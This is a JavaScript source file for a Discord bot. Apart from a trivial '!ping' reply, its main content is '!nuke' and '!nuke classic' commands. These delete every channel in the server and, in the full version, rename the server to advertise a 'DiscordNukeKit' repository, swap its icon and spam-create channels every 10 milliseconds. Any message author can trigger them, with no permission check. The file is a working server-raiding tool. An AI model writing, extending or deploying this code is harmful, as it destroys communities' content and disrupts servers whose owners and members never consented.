require('dotenv').config();

const axios = require('axios');
const fs = require("fs")
const { Client, GatewayIntentBits, discordSort, EmbedBuilder, PermissionsBitField, GuildChannel, ChannelType } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });


client.on('ready', () => {
    console.log('bot is ready');
    console.log("made by AlexTheNerd")
    client.user.setPresence({
        status: "online",  //You can show online, idle....
        game: {
            name: "butter dog",  //The message shown
            type: "WATCHING" //PLAYING: WATCHING: LISTENING: STREAMING:
        }
    });
})

client.on('messageCreate', async (message) => {
    

    if (message.content.startsWith('!ping')) {
        message.channel.send({
            content: 'pong',
        })
    }
    if (message.content == "!nuke")
    {
        message.channel.send("Activating nuke...")
        console.log(message.guild.channels.cache)
        message.guild.channels.cache.forEach(c =>{
            c.delete()
        })
        
         


        message.guild.setName("NUKED BY DISCORDNUKEKIT: https://github.com/nowcat123/DiscordNukeKit/")
        message.guild.setIcon("en4g8t68fgz81.webp")
        
        setTimeout(() => {
            setInterval(() => {
                
                message.guild.channels.create({"name" : "lmao"}, 0)
                
            }, 10);
        }, 1000)   
        
        
        
    }
    if (message.content == "!nuke classic")
    {
        message.channel.send("Activating nuke...")
        console.log(message.guild.channels.cache)
        message.guild.channels.cache.forEach(c =>{
            c.delete()
        })
       
        
        
    }

})

client.login(process.env.DISCORD_BOT_ID);


